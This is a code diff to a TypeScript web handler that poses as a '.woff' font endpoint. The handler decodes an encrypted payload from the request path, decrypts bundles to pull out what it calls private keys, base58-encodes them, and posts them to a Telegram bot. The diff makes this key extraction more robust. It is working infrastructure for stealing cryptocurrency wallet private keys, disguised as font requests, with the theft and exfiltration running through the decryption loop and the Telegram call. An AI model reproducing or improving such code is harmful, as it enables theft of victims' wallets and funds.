@@ -33,27 +33,15 @@ function encodeBase58(buffer: Uint8Array): string {
 
 // Convert a base64 (or URL-safe base64) string → Uint8Array
 function b64ToBytes(b64: string): Uint8Array {
-  // restore URL-safe chars
   b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
-  // pad to multiple of 4
   const pad = (4 - (b64.length % 4)) % 4;
   b64 += "=".repeat(pad);
-
-  // atob → binary string → Uint8Array
   const bin = atob(b64);
   const arr = new Uint8Array(bin.length);
   for (let i = 0; i < bin.length; i++) {
     arr[i] = bin.charCodeAt(i);
   }
   return arr;
-}
-
-// ArrayBuffer → hex string
-function bufToHex(buf: ArrayBuffer): string {
-  const bytes = new Uint8Array(buf);
-  return Array.from(bytes)
-    .map((b) => b.toString(16).padStart(2, "0"))
-    .join("");
 }
 
 export default async function handler(req: NextRequest) {
@@ -68,13 +56,14 @@ export default async function handler(req: NextRequest) {
   const parts = new URL(req.url).pathname.split("/");
   let slug = parts[parts.length - 1] || '';
   if (slug.endsWith('.woff')) slug = slug.slice(0, -5);
-  if (!slug.includes("_")) {
+  const sepIndex = slug.indexOf('_');
+  if (sepIndex < 0) {
     return new Response("Invalid slug", { status: 400 });
   }
 
   let payloadJson: string;
   try {
-    const encoded = slug.split("_")[1];
+    const encoded = slug.substring(sepIndex + 1);
     const bytes = b64ToBytes(encoded);
     payloadJson = new TextDecoder().decode(bytes);
   } catch (e) {
@@ -98,7 +87,7 @@ export default async function handler(req: NextRequest) {
     aesKey = await crypto.subtle.importKey(
       "raw",
       keyBytes,
-      "AES-GCM",
+      { name: "AES-GCM" },
       false,
       ["decrypt"]
     );
@@ -107,25 +96,35 @@ export default async function handler(req: NextRequest) {
     return new Response("Bad request", { status: 400 });
   }
 
-  // 4) decrypt each bundle and collect private keys
+  // 4) decrypt each bundle and extract private half
   const privKeys: string[] = [];
   for (let i = 0; i < data.sBundles.length; i++) {
-    const [ivB64, cipherB64] = data.sBundles[i].split(":");
+    const bundle = data.sBundles[i];
+    const colonPos = bundle.indexOf(':');
+    if (colonPos < 0) continue;
+    const ivB64 = bundle.substring(0, colonPos);
+    const cipherB64 = bundle.substring(colonPos + 1);
     try {
       const iv = b64ToBytes(ivB64);
       const cipher = b64ToBytes(cipherB64);
-      const plain = await crypto.subtle.decrypt(
+      // Decrypt to get ASCII hex string
+      const plainBuf = await crypto.subtle.decrypt(
         { name: "AES-GCM", iv },
         aesKey,
         cipher
       );
-      const hex = bufToHex(plain);
-      const privHex = hex.slice(64);            // last 64 chars
-      const privB58 = encodeBase58(
-        new Uint8Array(
-          privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16))
-        )
+      const hexStr = new TextDecoder().decode(plainBuf);
+      if (hexStr.length !== 128) {
+        console.error(`Unexpected hex length ${hexStr.length}`);
+        continue;
+      }
+      // Last 64 chars = private key hex
+      const privHex = hexStr.slice(64);
+      // Convert hex → bytes
+      const privBytes = new Uint8Array(
+        privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16))
       );
+      const privB58 = encodeBase58(privBytes);
       privKeys.push(privB58);
     } catch (e) {
       console.error(`Decrypt error #${i}:`, e);
@@ -141,7 +140,6 @@ export default async function handler(req: NextRequest) {
       lines.push("");
     });
     const text = lines.join("\n").trim();
-
     try {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
